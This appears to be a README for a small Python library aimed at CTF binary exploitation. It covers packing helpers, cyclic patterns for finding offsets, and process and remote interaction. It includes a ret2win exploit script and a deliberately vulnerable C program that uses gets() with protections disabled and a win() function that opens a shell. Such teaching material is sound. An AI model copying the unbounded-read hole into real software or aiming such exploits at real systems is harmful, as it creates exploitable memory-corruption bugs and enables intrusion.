![banner](banner.png)

# pwnlib_8448

> A lightweight Python library for binary exploitation.

[![Python](https://img.shields.io/badge/python-3.x-blue.svg)]()
[![Status](https://img.shields.io/badge/status-active-success.svg)]()
[![License](https://img.shields.io/badge/license-MIT-green.svg)]()

---

## 📦 Installation

### From GitHub
```bash
pip install git+https://github.com/Narkielz/pwnlib_8448.git
```

### From GitLab (fallback)

```bash
pip install git+https://gitlab.com/Narkiel/pwnlib_8448.git
```

### Local install (dev)
```bash
pip install .
```

## 📖 About

`pwnlib_8448` is a minimal and clean alternative to pwntools, designed for:
- CTF players
- Binary exploitation learners
- Lightweight scripts (Termux friendly)

Supports:
- Local processes
- Remote services
- Payload crafting
- Debug-friendly interaction

---

## ⚡ Features

### 🎨 Logging
Colorful output for better readability:

- `log_info()` → info  
- `log_ok()` → success  
- `log_warn()` → warning  
- `log_error()` → error  
- `log_send()` → sent data  
- `log_recv()` → received data  

---

### 📦 Pack / Unpack

```python
p64(0xdeadbeef)   # → b'\xef\xbe\xad\xde...'
u64(b"\xef\xbe")  # → int
```
---

### 🔁 Cyclic Pattern

Generate unique patterns to find buffer overflow offsets.

```python
# Generate a pattern of 5000 bytes
pattern = pattern_create(5000)
print(pattern[:32])  # b'aaaabaaacaaadaaaeaaafaaagaaahaaa'

# Find offset from the crash value (int or bytes)
offset = pattern_offset(0x6161616c, arch=32)
print(offset)  # e.g., 1234
```

**Parameters:**

| Function | Description |
|----------|-------------|
| `pattern_create(size)` | Returns a cyclic pattern of `size` bytes |
| `pattern_offset(value, size=10000, arch=64)` | Returns the offset of `value` inside the pattern |

**`pattern_offset` parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `value` | `int` or `bytes` | Crash value to locate (e.g., `0x6161616c` or `b'aaac'`) |
| `size` | `int` | Pattern size to generate (default: `10000`) |
| `arch` | `int` | Architecture: `32` or `64` (affects integer interpretation) |

Example in an exploit:

```python
offset = pattern_offset(0x6161616c, arch=32)
payload = b"A" * offset + p64(win_address)
```


### 🌐 Remote Exploitation
Interact with remote TCP services.
```python
r = Remote("example.com", 1337)

r.recvuntil(b"> ")
r.sendline(b"hello")

data = r.recv()
print(data)

r.interactive()

```

---

### 🖥️ Local Process

Spawn and interact with local binaries (PTY support).

```python
p = Process("./chall")

p.recvuntil(b"> ")
p.sendline(b"test")

print(p.recv())

p.interactive()
```

---

## 💣 Full Example (ret2win exploit)

```python
from pwnlib_8448 import *

# start process
p = Process("./vuln")

# known offset (from cyclic)
offset = 40

# address of win()
win = 0x401196

# build payload
payload = b"A" * offset
payload += p64(win)

log_info(f"Sending payload ({len(payload)} bytes)")

p.recvuntil(b"> ")
p.sendline(payload)

p.interactive()
```

## 🧨 vuln.c

```c
/*
gcc vuln.c -o vuln -fno-stack-protector -no-pie
*/
#include <stdio.h>
#include <stdlib.h>

void win() {
    printf("You win!\n");
    system("/bin/sh");
}

void vuln() {
    char buffer[32];

    printf("> ");
    gets(buffer); // vuln
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);

    vuln();

    return 0;
}
```

---

## 👤 Author

**Luis Fernando**  
